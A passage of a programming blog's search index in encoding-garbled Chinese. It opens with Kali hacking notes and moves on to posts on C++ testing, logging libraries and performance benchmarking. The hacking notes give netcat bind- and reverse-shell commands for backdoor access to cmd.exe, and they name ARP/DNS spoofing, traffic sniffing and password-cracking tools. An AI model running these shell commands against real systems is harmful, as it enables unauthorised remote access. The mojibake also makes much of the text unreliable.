æ¼æ´æ‰«æ è°·æ­Œæœç´ ç»“æœæ”¶é›† theharvester å¤šç§å¼•æ“å¯ä»¥ç”¨ åé—¨ç»´æŒè¿æ¥ netcat ç»´æŒäº† cmd.exe çš„æƒé™ ç›®æ ‡æœºå™¨ï¼šnc.exe -d -L -p 8888 -e cmd.exeï¼›å…¥ä¾µæœºå™¨ï¼šnc ç›®æ ‡ip 8888 å…¥ä¾µæœºå™¨ï¼šnc -l -p 8888ï¼›ç›®æ ‡æœºå™¨ï¼šnc.exe -d å…¥ä¾µæœºå™¨ip 8888 -e cmd.exe å†…ç½‘å®‰å…¨ arpæ¬ºéª—ï¼šettercap dnsæ¬ºéª— æˆªè·æ•°æ®æµé‡ï¼šåœ¨arpæ¬ºéª—åˆ°ç›®æ ‡ç½‘å¡åŸºç¡€ä¸Šï¼Œdriftnet -i ç›®æ ‡ç½‘å¡ å¯†ç æ”»å‡» medusa hashcat rarcrack: rar å¯†ç ç ´è§£ fcrackzip: zip å¯†ç ç ´è§£ crunch: ç¦»çº¿å¯†ç ç ´è§£ cewl: åœ¨çº¿å¯†ç ç ´è§£ hydra: åœ¨çº¿å¯†ç ç ´è§£","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"hack","slug":"Notes/hack","permalink":"https://racleray.github.io/categories/Notes/hack/"}],"tags":[{"name":"hack","slug":"hack","permalink":"https://racleray.github.io/tags/hack/"},{"name":"kali","slug":"kali","permalink":"https://racleray.github.io/tags/kali/"}],"author":"HeRui"},{"title":"å¼€å‘å·¥å…·","slug":"å¼€å‘å·¥å…·","date":"2023-01-03T10:41:33.000Z","updated":"2024-01-09T10:20:06.141Z","comments":true,"path":"posts/897196e0.html","link":"","permalink":"https://racleray.github.io/posts/897196e0.html","excerpt":"å¼€å‘å·¥å…·åº“","text":"C++ æ˜¯è§£å†³æ€§èƒ½é—®é¢˜çš„åˆ©å™¨ã€‚å½“ä½ çš„è½¯ä»¶å±äºè¿ç®—å¯†é›†æˆ–è€…å†…å­˜å¯†é›†å‹ï¼Œä½ éœ€è¦æ€§èƒ½ã€ä¸”æ„¿æ„ä¸ºæ€§èƒ½ä»˜å‡ºé¢å¤–ä»£ä»·çš„æ—¶å€™ï¼Œåº”è¯¥è€ƒè™‘â½¤ C++ï¼Œç‰¹åˆ«åœ¨ä½ çš„ä»£ç éœ€è¦éƒ¨ç½²åœ¨å¤šå°æœåŠ¡å™¨æˆ–è€…ç§»åŠ¨è®¾å¤‡çš„åœºåˆã€‚åä¹‹ï¼Œå¦‚æœæ€§èƒ½ä¸ä¼šæˆä¸ºä½ å¼€å‘çš„è½¯ä»¶çš„ç“¶é¢ˆï¼Œé‚£ C++ å¯èƒ½å°±ä¸æ˜¯â¼€ä¸ªæœ€åˆé€‚çš„â¼¯å…·ã€‚ C++ è¯­â¾”å°±åƒå­¦â¼€â»”æ´»è·ƒä½¿â½¤ä¸­çš„å¤–è¯­ï¼Œä½ ä¸è¦æœŸæœ›èƒ½å¤ŸæŒæ¡æ‰€æœ‰çš„å•è¯å’Œè¯­æ³•è§„åˆ™ã€‚æˆ‘ä»¬éœ€è¦çš„æ˜¯å¤šçœ‹å¤šå†™ï¼ŒæŒæ¡åˆé€‚ çš„â€œè¯­æ„Ÿâ€ï¼Œâ½½ä¸æ˜¯è®°ä½æ‰€æœ‰çš„è§„åˆ™ã€‚ æ’é”™å·¥å…· Valgrind æŸ¥å‡ºå†…å­˜ç›¸å…³çš„é”™è¯¯ã€‚ g++ -g test.cpp ç¼–è¯‘ä¹‹åï¼Œç„¶åä½¿â½¤ valgrind --leak-check=full ./a.outã€‚ Compiler Explorer https://godbolt.org/ C++ Insights https://cppinsights.io/ å•å…ƒæµ‹è¯• Boost.Test 1234567891011121314151617181920212223#define BOOST_TEST_MAIN #include &lt;boost/test/unit_test.hpp&gt; #include &lt;stdexcept&gt;void test(int n) &#123; if (n == 42) &#123; return; &#125; throw std::runtime_error( \"Not the answer\");&#125;BOOST_AUTO_TEST_CASE(my_test) &#123; BOOST_TEST_MESSAGE(\"Testing\"); BOOST_TEST(1 + 1 == 2); BOOST_CHECK_THROW( test(41), std::runtime_error); BOOST_CHECK_NO_THROW(test(42)); int expected = 5; BOOST_TEST(2 + 2 == expected); BOOST_CHECK(2 + 2 == expected);&#125;BOOST_AUTO_TEST_CASE(null_test) &#123; &#125; Catch2 åªéœ€è¦å•ä¸ªå¤´â½‚ä»¶å³å¯ä½¿â½¤ï¼Œä¸éœ€è¦å®‰è£…å’Œé“¾æ¥ï¼Œç®€å•â½…ä¾¿ å¯é€‰ä½¿â½¤ BDDï¼ˆBehavior-Driven Developmentï¼‰â»›æ ¼çš„åˆ†èŠ‚å½¢å¼ æµ‹è¯•å¤±è´¥å¯é€‰ç›´æ¥è¿›â¼Šè°ƒè¯•å™¨ï¼ˆWindows å’Œ macOS ä¸Šï¼‰ 123456789101112131415161718192021#define CATCH_CONFIG_MAIN#include \"catch.hpp\" #include &lt;stdexcept&gt;void test(int n) &#123; if (n == 42) &#123; return; &#125; throw std::runtime_error( \"Not the answer\");&#125;TEST_CASE(\"My first test\", \"[my]\") &#123; INFO(\"Testing\"); CHECK(1 + 1 == 2); CHECK_THROWS_AS( test(41), std::runtime_error); CHECK_NOTHROW(test(42)); int expected = 5; CHECK(2 + 2 == expected);&#125;TEST_CASE(\"A null test\", \"[null]\") &#123; &#125; BDD â»›æ ¼çš„æµ‹è¯•: 1234567891011121314151617181920212223242526272829303132#define CATCH_CONFIG_MAIN #include \"catch.hpp\"SCENARIO(\"Int container can be accessed and modified\", \"[container]\")&#123; GIVEN(\"A container with initialized items\") &#123; IntContainer c&#123;1, 2, 3, 4, 5&#125;; REQUIRE(c.size() == 5); WHEN(\"I access existing items\") &#123; THEN(\"The items can be retrieved intact\") &#123; CHECK(c[0] == 1); CHECK(c[1] == 2); CHECK(c[2] == 3); CHECK(c[3] == 4); CHECK(c[4] == 5); &#125; &#125; WHEN(\"I modify items\") &#123; c[1] = -2; c[3] = -4; THEN(\"Only modified items are changed\") &#123; CHECK(c[0] == 1); CHECK(c[1] == -2); CHECK(c[2] == 3); CHECK(c[3] == -4); CHECK(c[4] == 5); &#125; &#125; &#125;&#125; æ—¥å¿—åº“ Easylogging++ Easylogging++ â¼€å…±åªæœ‰ä¸¤ä¸ªâ½‚ä»¶ï¼Œâ¼€ä¸ªæ˜¯å¤´â½‚ä»¶ï¼Œâ¼€ä¸ªæ˜¯æ™®é€š C++ æºâ½‚ä»¶ã€‚ 123456#include \"easylogging++.h\" INITIALIZE_EASYLOGGINGPPint main() &#123; LOG(INFO) &lt;&lt; \"My first info log\"; &#125; 1g++ -std=c++17 test.cpp easylogging++.cc spdlog 123456789#include \"spdlog/spdlog.h\"#include \"spdlog/sinks/basic_file_sink.h\"int main() &#123; spdlog::info(\"My first info log\"); auto file_logger = spdlog::basic_logger_mt( \"basic_logger\", \"test.log\"); spdlog::set_default_logger( file_logger); spdlog::info(\"Into file: &#123;1&#125; &#123;0&#125;\", \"world\", \"hello\");&#125; å…¶ä»–æ¯”å¦‚ï¼šBoost.Logã€g3log ç­‰ ç½‘ç»œåº”ç”¨å·¥å…·åº“ C++ REST SDK cpprestsdk ï¼šhttps://github.com/microsoft/cpprestsdk ä½¿ç”¨æ—¶ï¼Œç¼–è¯‘éº»çƒ¦ï¼š Windows MSVCï¼š 1cl /EHsc /std:c++17 test.cpp cpprest.lib zlib.lib libeay32.lib ssleay32.lib winhttp.lib httpapi.lib bcrypt.lib crypt32.lib advapi32.lib gdi32.lib user32.lib Linux GCCï¼š 1g++ -std=c++17 -pthread test.cpp -lcpprest -lcrypto -lssl lboost_thread -lboost_chrono -lboost_system","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"C++","slug":"Tools/C","permalink":"https://racleray.github.io/categories/Tools/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Python","slug":"Python","permalink":"https://racleray.github.io/tags/Python/"}],"author":"HeRui"},{"title":"Cppæ€§èƒ½æµ‹è¯•","slug":"Cppæ€§èƒ½æµ‹è¯•","date":"2022-12-09T05:04:05.000Z","updated":"2024-03-03T16:14:54.388Z","comments":true,"path":"posts/f692d883.html","link":"","permalink":"https://racleray.github.io/posts/f692d883.html","excerpt":"C++é«˜æ€§èƒ½ç¼–ç¨‹æµ‹è¯•ç”¨ç¯å¢ƒ","text":"å®éªŒä¸€ å…ˆç¡®å®šæµ‹é‡æŒ‡æ ‡ ä»å®é™…è¿è¡Œæœé›†è¾“å…¥ ä¸è¦å¯¹æ€§èƒ½è¿›è¡Œå‡è®¾ ä½¿ç”¨å¾®åŸºå‡†æµ‹è¯•æ·±å…¥ç†è§£ä»£ç  éƒ¨åˆ†æœ‰ç›Šçš„ä¼˜åŒ–ï¼Œå¯èƒ½å¯¹ç¨‹åºæ•´ä½“æœ‰å®³ é«˜æ€§èƒ½ç¨‹åºçš„å¼€å‘ä¸ä¼˜åŒ–ï¼Œä¸æ˜¯çº¿æ€§è¿‡ç¨‹ï¼Œå¯èƒ½éœ€è¦åœ¨é«˜çº§æ¦‚è§ˆå’Œä½çº§ç»†èŠ‚ä¸­åå¤è¿­ä»£æµ‹è¯• åœ¨æ€§èƒ½æ–¹é¢ï¼Œæ²¡æœ‰ä»€ä¹ˆæ˜¯æ˜¾è€Œæ˜“è§çš„ çœ‹ä¼¼ä¸å¿…è¦çš„ä»£ç ï¼Œåˆ é™¤ä¹‹åï¼Œå¯èƒ½ä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™ï¼Œè¯·ææ¸…æ¥šå¦‚ä½•æœ‰æ•ˆåˆ©ç”¨ CPU ä»¥è·å¾—æ€§èƒ½æå‡ Pre-requirements 12345678sudo pacman -S gperftoolsgit clone https://github.com/google/benchmark.git --depth=1cd benchmarkcmake -E make_directory \"build\"cmake -E chdir \"build\" cmake -DBENCHMARK_DOWNLOAD_DEPENDENCIES=on -DCMAKE_BUILD_TYPE=Release ../cmake --build \"build\" --config Release 12// codegit clone git@github.com:PacktPublishing/The-Art-of-Writing-Efficient-Programs.git gperftools 1clang++ -g -O3 -mavx2 -Wall -pedantic 02_substring_sort.C -o example &amp;&amp; CPUPROFILE=prof.data ./example &amp;&amp; pprof --text ./example prof.data 1clang++ -g -O3 -mavx2 -Wall -pedantic 03_substring_sort.C -o example &amp;&amp; CPUPROFILE=prof.data ./example &amp;&amp; pprof --text ./example prof.data 1clang++ -g -O3 -mavx2 -Wall -pedantic 04_substring_sort.C -o example &amp;&amp; CPUPROFILE=prof.data ./example &amp;&amp; pprof --text ./example prof.data clang++ 13 åœ¨ -O3 ä¸‹çš„ç»“æœï¼Œå’Œ clang++-11 çš„ç»“æœä¸åŒã€‚ å¯¹ compare å‡½æ•°çš„ä¼˜åŒ–ï¼Œ13 å®åœ¨æ˜¯å¤ªå‰å®³äº†ã€‚ perf ä½¿ç”¨ç¡¬ä»¶æ€§èƒ½è®¡æ•°å™¨å’ŒåŸºäºæ—¶é—´çš„é‡‡æ ·ã€‚ 12345678// å¯é€‰äº‹ä»¶åˆ—è¡¨perf listperf stat ./example// æ€§èƒ½åˆ†æå™¨perf record ./exampleperf report ç”±äºç¼–è¯‘å™¨ä¼˜åŒ–ï¼ŒæŒ‡ä»¤é‡æ’ç­‰ï¼Œperf æ˜¾ç¤ºçš„æ±‡ç¼–ä»£ç å’Œæºä»£ç çš„å¯¹åº”å…³ç³»å¹¶ä¸å‡†ç¡®ã€‚ Google Performance 123456// -lprofilerclang++ -g -O3 -mavx2 -Wall -pedantic -lprofiler 02_substring_sort.C -o exampleCPUPROFILE=prof.data CPUPROFILE_FREQUENCY=1000 ./examplepprof ./example prof.data 12// è°ƒç”¨å›¾pprof --pdf ./example prof.data &gt; prof.pdf å¾®åŸºå‡†æµ‹è¯• å¤§å‹ç¨‹åºæ€§èƒ½æµ‹è¯•ï¼š æ•´ä½“ç¼–è¯‘æ—¶é—´é•¿ æ€§èƒ½å…³é”®éƒ¨åˆ†ä¸é‚£ä¹ˆæ˜æ˜¾ ç›®æ ‡ä¸Šä¸‹æ–‡å‘ç”Ÿçš„æ¦‚ç‡å¯èƒ½è¾ƒå°ï¼Œæ¯”å¦‚ç‰¹å®šçš„ç½‘ç»œè¯·æ±‚æ—¶å‘ç”Ÿ å¾®åŸºå‡†æµ‹è¯•ï¼Œå…³æ³¨æŸä¸ªå‡½æ•°çš„æµ‹è¯•ã€‚é€šè¿‡è®¾ç½®å‡½æ•°çš„èµ·å§‹æ¡ä»¶ï¼Œè½»æ¾è°ƒç”¨æ­¤ä»£ç ç‰‡æ®µã€‚ å¦å¤–ï¼Œå¾®åŸºå‡†æµ‹è¯• ä¸¥é‡ä¾èµ–è¿è¡Œä»£ç æ—¶ï¼Œç¨‹åºæ‰€å¤„çš„ä¸Šä¸‹æ–‡ç¯å¢ƒã€‚æµ‹è¯•æ—¶ï¼Œå°†ç›®æ ‡å‡½æ•°æ”¾å•ç‹¬åœ¨ä¸€ä¸ªç¼–è¯‘å•å…ƒç¼–è¯‘ï¼Œå¯ä»¥ç¼“è§£ç¼–è¯‘å™¨ä¼˜åŒ–ï¼Œå¯¹ç›®æ ‡å‡½æ•°çš„è¿è¡Œç»“æœçš„å½±å“ã€‚ å¾®åŸºå‡†æµ‹è¯•ï¼Œä¸å¯ä¸ä¿¡ï¼Œä¸å¯å…¨ä¿¡ã€‚ ç¼–è¯‘å™¨ä¼˜åŒ– C++ æ ‡å‡†ä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ªå…³é”®æ¦‚å¿µï¼šå¯è§‚å¯Ÿè¡Œä¸ºï¼ˆobservable behaviorï¼‰ã€‚ ç¼–è¯‘å™¨å¯ä»¥å¯¹ç¨‹åºè¿›è¡Œä»»ä½•å®ƒæƒ³è¦çš„æ›´æ”¹ï¼Œåªè¦è¿™äº›æ›´æ”¹çš„ç»“æœä¸ä¼šæ”¹å˜å¯è§‚å¯Ÿè¡Œä¸ºçš„ç»“æœã€‚ volatile å¯¹è±¡çš„è®¿é—®ï¼Œä¸¥æ ¼æŒ‰ç…§è¡¨è¾¾å¼çš„è¯­ä¹‰ï¼Œä¸ä¼šå¯¹å…¶é‡æ–°æ’åº ç¨‹åºç»ˆæ­¢æ—¶ï¼Œå†™å…¥æ–‡ä»¶æ—¶ï¼Œä¸¥æ ¼æŒ‰ç…§ç¨‹åºå†™å…¥çš„æ–¹å¼æ‰§è¡Œ å‘é€åˆ°äº¤äº’è®¾å¤‡çš„æç¤ºæ–‡æœ¬ï¼Œå°†åœ¨ç¨‹åºç­‰å¾…è¾“å…¥ä¹‹å‰ï¼Œè¾“å‡ºæ˜¾ç¤ºã€‚è¾“å…¥å’Œè¾“å‡ºæ“ä½œä¸èƒ½è¢«çœç•¥æˆ–è€…é‡æ’ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;chrono&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;memory&gt;using std::chrono::duration_cast;using std::chrono::microseconds;using std::chrono::system_clock;using std::cout;using std::endl;using std::unique_ptr;bool compare1(const char* s1, const char* s2) &#123; int i1 = 0, i2 = 0; char c1, c2; while (1) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; ++i1; ++i2; &#125;&#125;bool compare2(const char* s1, const char* s2) &#123; unsigned int i1 = 0, i2 = 0; char c1, c2; while (1) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; ++i1; ++i2; &#125;&#125;int main() &#123; constexpr unsigned int N = 1 &lt;&lt; 20; constexpr int NI = 1 &lt;&lt; 11; unique_ptr&lt;char[]&gt; s(new char[2*N]); ::memset(s.get(), 'a', 2*N*sizeof(char)); s[2*N-1] = 0; system_clock::time_point t0 = system_clock::now(); for (int i = 0; i &lt; NI; ++i) &#123; compare1(s.get(), s.get() + N); &#125; system_clock::time_point t1 = system_clock::now(); for (int i = 0; i &lt; NI; ++i) &#123; compare2(s.get(), s.get() + N); &#125; system_clock::time_point t2 = system_clock::now(); cout &lt;&lt; duration_cast&lt;microseconds&gt;(t1 - t0).count() &lt;&lt; \"us \" &lt;&lt; duration_cast&lt;microseconds&gt;(t2 - t1).count() &lt;&lt; \"us\" &lt;&lt; endl;&#125; è¿™æ®µç¨‹åºï¼Œcompare1ã€compare2 ä¸ä¼šæ”¹å˜ç¨‹åºä¸­ s çš„å¯è§‚å¯Ÿè¡Œä¸ºã€‚ç¼–è¯‘å™¨ç›´æ¥è·³è¿‡æ‰§è¡Œã€‚è¾“å‡ºæ—¶é—´æ˜¯ 0ã€‚ ä½¿ç”¨ volatile å¯ä»¥æ­£å¸¸æ‰§è¡Œæµ‹è¯•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;chrono&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;memory&gt;using std::chrono::duration_cast;using std::chrono::microseconds;using std::chrono::system_clock;using std::cout;using std::endl;using std::unique_ptr;bool compare1(const char* s1, const char* s2) &#123; int i1 = 0, i2 = 0; char c1, c2; while (1) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; ++i1; ++i2; &#125;&#125;bool compare2(const char* s1, const char* s2) &#123; unsigned int i1 = 0, i2 = 0; char c1, c2; while (1) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; ++i1; ++i2; &#125;&#125;int main() &#123; constexpr unsigned int N = 1 &lt;&lt; 20; constexpr int NI = 1 &lt;&lt; 11; unique_ptr&lt;char[]&gt; s(new char[2*N]); ::memset(s.get(), 'a', 2*N*sizeof(char)); s[2*N-1] = 0; volatile bool sink; // difference system_clock::time_point t0 = system_clock::now(); for (int i = 0; i &lt; NI; ++i) &#123; sink = compare1(s.get(), s.get() + N); // difference &#125; system_clock::time_point t1 = system_clock::now(); for (int i = 0; i &lt; NI; ++i) &#123; sink = compare2(s.get(), s.get() + N); // difference &#125; system_clock::time_point t2 = system_clock::now(); cout &lt;&lt; duration_cast&lt;microseconds&gt;(t1 - t0).count() &lt;&lt; \"us \" &lt;&lt; duration_cast&lt;microseconds&gt;(t2 - t1).count() &lt;&lt; \"us\" &lt;&lt; endl;&#125; Google benchmark 1234567891011git clone https://github.com/google/benchmark.git --depth=1cd benchmarkcmake -E make_directory \"build\"cmake -E chdir \"build\" cmake -DBENCHMARK_DOWNLOAD_DEPENDENCIES=on -DCMAKE_BUILD_TYPE=Release ../cmake --build \"build\" --config Releaseexport GBEN_INC=xxx/benchmark/include/export GBEN_LIB=xxx/benchmark/build/src/clang++ -g -O3 -mavx2 -Wall -pedantic -I$GBEN_INC -lpthread -lrt -lm 10a_compare_mbm.C $GBEN_LIB/libbenchmark.a -o benchmark 1./benchmark 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;memory&gt;#include \"benchmark/benchmark.h\"using std::unique_ptr;bool compare_int(const char* s1, const char* s2) &#123; char c1, c2; for (int i1 = 0, i2 = 0; ; ++i1, ++i2) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; &#125;&#125;bool compare_uint(const char* s1, const char* s2) &#123; char c1, c2; for (unsigned int i1 = 0, i2 = 0; ; ++i1, ++i2) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; &#125;&#125;bool compare_uint_l(const char* s1, const char* s2, unsigned int l) &#123; if (s1 == s2) return false; char c1, c2; for (unsigned int i1 = 0, i2 = 0; i1 &lt; l; ++i1, ++i2) &#123; c1 = s1[i1]; c2 = s2[i2]; if (c1 != c2) return c1 &gt; c2; &#125; return false;&#125;void BM_loop_int(benchmark::State&amp; state) &#123; const unsigned int N = state.range(0); unique_ptr&lt;char[]&gt; s(new char[2*N]); ::memset(s.get(), 'a', 2*N*sizeof(char)); s[2*N-1] = 0; const char* s1 = s.get(), *s2 = s1 + N; for (auto _ : state) &#123; benchmark::DoNotOptimize(compare_int(s1, s2)); &#125; state.SetItemsProcessed(N*state.iterations());&#125;void BM_loop_uint(benchmark::State&amp; state) &#123; const unsigned int N = state.range(0); unique_ptr&lt;char[]&gt; s(new char[2*N]); ::memset(s.get(), 'a', 2*N*sizeof(char)); s[2*N-1] = 0; const char* s1 = s.get(), *s2 = s1 + N; for (auto _ : state) &#123; benchmark::DoNotOptimize(compare_uint(s1, s2)); &#125; state.SetItemsProcessed(N*state.iterations());&#125;void BM_loop_uint_l(benchmark::State&amp; state) &#123; const unsigned int N = state.range(0); unique_ptr&lt;char[]&gt; s(new char[2*N]); ::memset(s.get(), 'a', 2*N*sizeof(char)); s[2*N-1] = 0; const char* s1 = s.get(), *s2 = s1 + N; for (auto _ : state) &#123; benchmark::DoNotOptimize(compare_uint_l(s1, s2, 2*N)); &#125; state.SetItemsProcessed(N*state.iterations());&#125;#define ARGS -&gt;Arg(1&lt;&lt;20)BENCHMARK(BM_loop_int) ARGS;BENCHMARK(BM_loop_uint) ARGS;BENCHMARK(BM_loop_uint_l) ARGS;BENCHMARK_MAIN(); benchmark::State&amp; state : å…¥å‚ï¼›state.SetItemsProcessed : æŠ¥å‘Šä»£ç æ¯ç§’å¤„ç†çš„å­—ç¬¦æ•°ï¼›-&gt;Arg(1&lt;&lt;20) : å‘ BENCHMARK å®ä¼ é€’å‚æ•°ã€‚ benchmark::DoNotOptimize : ç±»ä¼¼ volatile sink çš„ä½œç”¨ï¼Œä¸ä¼šå°† compare_uint å‡½æ•°è°ƒç”¨ä¼˜åŒ–æ‰ï¼Œä½†æ˜¯å‡½æ•°å†…éƒ¨é€»è¾‘è¿˜æ˜¯ä¼šè¿›è¡Œä¼˜åŒ–ã€‚ å®éªŒäºŒ é«˜æ•ˆåˆ©ç”¨ CPU èµ„æº CPU æŒ‡ä»¤è¿è¡Œä¼˜åŒ– å¯¹äºæ¯æ¬¡å¾ªç¯ï¼Œç‹¬ç«‹åœ°ï¼Œå¯¹å¯„å­˜å™¨ä¸­ç›¸åŒçš„æ•°æ®ï¼Œè¿›è¡Œä¸åŒçš„æ“ä½œï¼Œæ˜¯å¯ä»¥æŒ‡ä»¤çº§å¹¶è¡Œçš„ã€‚ æ•°æ®ä¾èµ–ä¾é æµæ°´çº¿æŠ€æœ¯ï¼Œé”™ä½æ‰§è¡Œã€‚æ¯ä¸ªå¾ªç¯ä½¿ç”¨ç›¸åŒçš„å¯„å­˜å™¨ï¼Œå¯¹äºåŒä¸€ä¸ªå¯„å­˜å™¨ä¸èƒ½åœ¨ä¸€ä¸ªå‘¨æœŸå†…æ—¢è¯»åˆå†™ã€‚ä½†æ˜¯è¿™æ˜¯å¯¹äºç¼–è¯‘å™¨è€Œè¨€ï¼Œå®é™…ä¸Šç¡¬ä»¶ä¸Šçš„å¯„å­˜å™¨å¹¶ä¸ä¸€å®šç›¸åŒã€‚å¯„å­˜å™¨é‡å‘½åï¼Œå¯ä»¥ä½¿å¾—ç›¸åŒå¯„å­˜å™¨åç§°å®é™…åœ¨è¿è¡Œæ—¶å¯ä»¥å¯¹åº”åˆ°ä¸åŒçš„ç¡¬ä»¶å¯„å­˜å™¨ã€‚ æµæ°´çº¿æŠ€æœ¯éœ€è¦è¶³å¤Ÿå¤šçš„æŒ‡ä»¤æ‰èƒ½å‘æŒ¥å‡ºå…¶æ€§èƒ½ä¼˜åŠ¿ã€‚å¦‚æœå‡ºç°åˆ†æ”¯ï¼Œé‚£ä¹ˆéœ€è¦åˆ†æ”¯é¢„æµ‹ï¼Œæ¥å°½å¯èƒ½æä¾›æ›´å¤šçš„æŒ‡ä»¤æ¥è¿è¡Œã€‚ åˆ†æ”¯é¢„æµ‹ + æ¨æµ‹æ‰§è¡Œï¼Œå¤„ç†å™¨ä¼šæ ¹æ®å†å²è¿è¡Œç»“æœï¼Œæ¨æµ‹æ˜¯å¦éœ€è¦æ‰§è¡ŒæŸä¸ªåˆ†æ”¯çš„æŒ‡ä»¤ã€‚å¦‚æœé¢„æµ‹æ­£ç¡®ï¼Œå¹¶è¡ŒåŒ–æé«˜äº†æ€§èƒ½ï¼›å¦‚æœé¢„æµ‹é”™è¯¯ï¼Œå°±éœ€è¦å†²åˆ·æµæ°´çº¿ï¼Œä¸¢å¼ƒé¢„æµ‹é”™è¯¯çš„æŒ‡ä»¤ã€‚ perf stat ./benchmark å¯ä»¥æŸ¥çœ‹åˆ†æ”¯é¢„æµ‹çš„æƒ…å†µ æ¨æµ‹æ‰§è¡Œå¯èƒ½ä¼šå‡ºç°é—®é¢˜ï¼Œæ¯”å¦‚ *ptr è§£å¼•ç”¨äº† NULL æŒ‡é’ˆï¼Œä½†æ˜¯ç”±äº CPU ä¼šåœ¨ç¼“å†²åŒºè¿›è¡Œæ¨æµ‹æ‰§è¡Œï¼Œä½†æ˜¯ CPU ä¼šå‡è£…ä»æœªå‘ç”Ÿã€‚ å¾ªç¯å±•å¼€ä¹Ÿè®¸ä¼šå¯¹ç°ä»£ç¼–è¯‘å™¨ä¸‹çš„ä»£ç äº§ç”Ÿæœ‰ç›Šçš„å½±å“ï¼Œä½†æ˜¯ä¸æ˜¯ä¸€å®šçš„ã€‚å› ä¸ºè®¸å¤šå‘é‡åŒ–ç¼–è¯‘å™¨ï¼Œä¼šä½¿ç”¨ SSE æˆ–è€… AVX æŒ‡ä»¤æ¥ä¼˜åŒ–å¾ªç¯çš„æ‰§è¡Œï¼Œä¸€æ¬¡å¤„ç†å¤šä¸ªå…ƒç´ ã€‚æ‰€ä»¥ï¼Œæ‰‹åŠ¨å¾ªç¯å±•å¼€ï¼Œä¸ä¸€å®šä¼šæ›´é«˜æ•ˆã€‚ æµ‹è¯•è¿ç®—æŒ‡ä»¤ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include \"benchmark/benchmark.h\"void BM_add(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; &#125; // ä¸è®©ç¼–è¯‘å™¨å¯¹ state æ¬¡ç›¸åŒçš„æ“ä½œï¼Œè¿›è¡Œä¼˜åŒ– // ä½†æ˜¯å†…å±‚å¾ªç¯çš„è¿ç®—æ“ä½œçš„ä¼˜åŒ–ï¼Œä»ç„¶ç”Ÿæ•ˆ benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); // å¼ºåˆ¶å†™å‡ºç»“æœåˆ°å†…å­˜ï¼Œé«˜æ•ˆçš„ å†…å­˜å±éšœ benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_multiply(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a2 += p1[i] * p2[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_divide(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand() + 1; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a2 += p1[i] / p2[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_add_multiply(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; a2 += p1[i] * p2[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; 